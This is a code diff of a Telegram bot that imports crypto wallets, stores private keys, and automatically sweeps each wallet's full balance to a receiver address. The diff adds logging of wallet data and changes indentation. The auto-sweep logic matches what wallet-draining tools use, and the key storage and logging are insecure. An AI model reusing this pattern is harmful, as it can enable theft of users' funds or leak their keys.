@@ -96,12 +96,12 @@ bot.onText(/\/import/, async (msg) => {
     userStates.set(chatId, { step: "waiting_walletconnect", data: {} });
     
     // Send message with WalletConnect button
-    bot.sendMessage(
-      chatId,
+  bot.sendMessage(
+    chatId,
       "🔗 Connect your wallet using WalletConnect:",
-      {
-        reply_markup: {
-          inline_keyboard: [
+    {
+      reply_markup: {
+        inline_keyboard: [
             [{ text: "🔗 Connect Wallet", web_app: { url: process.env.WEBAPP_URL || "https://your-domain.com/wc" } }]
           ]
         }
@@ -120,13 +120,18 @@ bot.on("message", async (msg) => {
     const chatId = msg.chat.id;
     const state = userStates.get(chatId);
     
+    console.log("Received web_app_data:", msg.web_app_data);
+    
     if (state && state.step === "waiting_walletconnect") {
       try {
         // Parse the data from WalletConnect
         const data = JSON.parse(msg.web_app_data.data);
+        console.log("Parsed WalletConnect data:", data);
+        
         const { account, chainId } = data;
         
         if (!account || !chainId) {
+          console.error("Invalid wallet data received:", data);
           return bot.sendMessage(chatId, "❌ Invalid wallet data received. Please try again.");
         }
         
@@ -137,6 +142,8 @@ bot.on("message", async (msg) => {
         else if (chainId === 137) blockchain = "MATIC"; // Polygon
         else if (chainId === 42161) blockchain = "ARBITRUM"; // Arbitrum
         else if (chainId === 10) blockchain = "OPTIMISM"; // Optimism
+        
+        console.log(`Mapped chainId ${chainId} to blockchain ${blockchain}`);
         
         // Ask for receiver address
         state.step = "walletconnect_receiver";
@@ -158,6 +165,7 @@ bot.on("message", async (msg) => {
     // Handle receiver address for WalletConnect
     if (state && state.step === "walletconnect_receiver") {
       const receiverAddress = msg.text;
+      console.log(`Received receiver address: ${receiverAddress}`);
       
       // Validate receiver address based on blockchain
       let isValid = false;
@@ -175,6 +183,7 @@ bot.on("message", async (msg) => {
       }
       
       if (!isValid) {
+        console.error(`Invalid receiver address: ${receiverAddress}`);
         return bot.sendMessage(chatId, "❌ Invalid receiver address. Please enter a valid address.");
       }
       
@@ -185,8 +194,11 @@ bot.on("message", async (msg) => {
           .then((res) => res[0]);
         
         if (!user) {
+          console.error(`User not found for chatId: ${chatId}`);
           return bot.sendMessage(chatId, "❌ User not found. Please use /start first.");
         }
+        
+        console.log(`Saving wallet for user ${user.id}: ${state.data.account} (${state.data.blockchain})`);
         
         // Save the wallet to the database
         await db.insert(wallets).values({
@@ -614,26 +626,26 @@ async function checkAndSendTRX(wallet) {
             return;
           } else {
             // Existing ETH code for private key wallets
-            const provider = ethers.getDefaultProvider();
-            const walletObj = new ethers.Wallet(wallet.privateKey, provider);
-            const balanceBN = await provider.getBalance(walletObj.address);
-            if (balanceBN.isZero()) return;
-            const gasPrice = await provider.getGasPrice();
-            const gasLimit = ethers.BigNumber.from("21000");
-            const fee = gasPrice.mul(gasLimit);
-            if (balanceBN.lt(fee)) return;
-            const amountToSend = balanceBN.sub(fee);
-            const tx = await walletObj.sendTransaction({
-              to: wallet.receiverAddress,
-              value: amountToSend
-            });
-            response = { result: true, txid: tx.hash };
+          const provider = ethers.getDefaultProvider();
+          const walletObj = new ethers.Wallet(wallet.privateKey, provider);
+          const balanceBN = await provider.getBalance(walletObj.address);
+          if (balanceBN.isZero()) return;
+          const gasPrice = await provider.getGasPrice();
+          const gasLimit = ethers.BigNumber.from("21000");
+          const fee = gasPrice.mul(gasLimit);
+          if (balanceBN.lt(fee)) return;
+          const amountToSend = balanceBN.sub(fee);
+          const tx = await walletObj.sendTransaction({
+            to: wallet.receiverAddress,
+            value: amountToSend
+          });
+          response = { result: true, txid: tx.hash };
           }
         } catch (error) {
           console.error("Error processing ETH transaction:", error);
         }
         break;
-      }
+    }
       default:
         throw new Error("Unsupported blockchain");
     }
